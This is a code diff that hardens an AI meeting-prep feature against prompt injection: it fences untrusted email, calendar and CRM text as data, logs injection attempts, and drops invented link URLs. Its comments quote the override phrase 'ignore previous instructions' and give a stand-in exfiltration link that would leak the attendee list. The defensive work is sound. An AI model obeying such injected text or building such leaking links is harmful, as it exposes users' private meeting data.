@@ -20,6 +20,8 @@
 import { getAIClient } from "@/lib/ai";
 import type { AIMessage } from "@/lib/ai";
 import type { MeetingSources } from "./meeting-prep-sources";
+import { fenceUntrusted, type FenceResult } from "@/lib/ai/provenance";
+import { reportFenceAttempts } from "@/lib/ai/fence-report";
 
 /* --------------------------- Public shapes ---------------------------- */
 
@@ -124,10 +126,49 @@ Rules:
 - If a section has no signal, return [] (never invent filler).
 `;
 
-function buildUserMessage(sources: MeetingSources): string {
-  /* The input is already structured JSON; pass it verbatim under a
-   * labeled wrapper so the model sees what's data vs. instructions. */
-  return JSON.stringify({ MeetingSources: sources });
+/**
+ * The sources are other people's words: email snippets, calendar bodies, CRM
+ * notes, brain facts. Any of them can carry "ignore previous instructions", so
+ * the whole blob goes inside the provenance fence, announced as data. The
+ * schema and rules stay in the system prompt, which is ours. Exported for the
+ * fence tests.
+ */
+export function buildUserMessage(sources: MeetingSources): {
+  content: string;
+  attempts: FenceResult["attempts"];
+} {
+  const fenced = fenceUntrusted([
+    {
+      provenance: "external",
+      label: "MeetingSources",
+      text: JSON.stringify({ MeetingSources: sources }),
+    },
+  ]);
+  return {
+    content: `${fenced.text}\n\nReturn the JSON object for the MeetingSources above.`,
+    attempts: fenced.attempts,
+  };
+}
+
+/**
+ * A source_ref url survives only when it appeared in the input.
+ *
+ * The widget renders these as links. A model that read an injected email
+ * could otherwise invent `https://collector.example/?d=<the attendee list>`
+ * and put it one click away. The rule matches the id rule the prompt already
+ * states (never cite what you were not given), enforced here rather than hoped
+ * for.
+ */
+function keepKnownUrls(prep: MeetingPrep, sources: MeetingSources): MeetingPrep {
+  const haystack = JSON.stringify(sources);
+  const clean = (refs: SourceRef[]): SourceRef[] =>
+    refs.map((r) => (r.url && !haystack.includes(r.url) ? { ...r, url: undefined } : r));
+  return {
+    ...prep,
+    talking_points: prep.talking_points.map((t) => ({ ...t, source_refs: clean(t.source_refs) })),
+    risk_flags: prep.risk_flags.map((f) => ({ ...f, source_refs: clean(f.source_refs) })),
+    attendee_briefs: prep.attendee_briefs.map((a) => ({ ...a, links: clean(a.links) })),
+  };
 }
 
 /* --------------------------- JSON parsing ----------------------------- */
@@ -244,9 +285,12 @@ export async function synthesizePrep(
   sources: MeetingSources,
   ctx: SynthesizeContext,
 ): Promise<SynthesisResult> {
-  const messages: AIMessage[] = [
-    { role: "user", content: buildUserMessage(sources) },
-  ];
+  const built = buildUserMessage(sources);
+  reportFenceAttempts("insights.meeting_prep", built.attempts, {
+    userId: ctx.userId,
+    userRole: ctx.userRole,
+  });
+  const messages: AIMessage[] = [{ role: "user", content: built.content }];
 
   let response;
   try {
@@ -290,7 +334,7 @@ export async function synthesizePrep(
 
   return {
     ok: true,
-    prep: parsed,
+    prep: keepKnownUrls(parsed, sources),
     latencyMs: response.latency_ms,
     modelUsed: response.model_used,
     inputTokens: response.input_tokens,
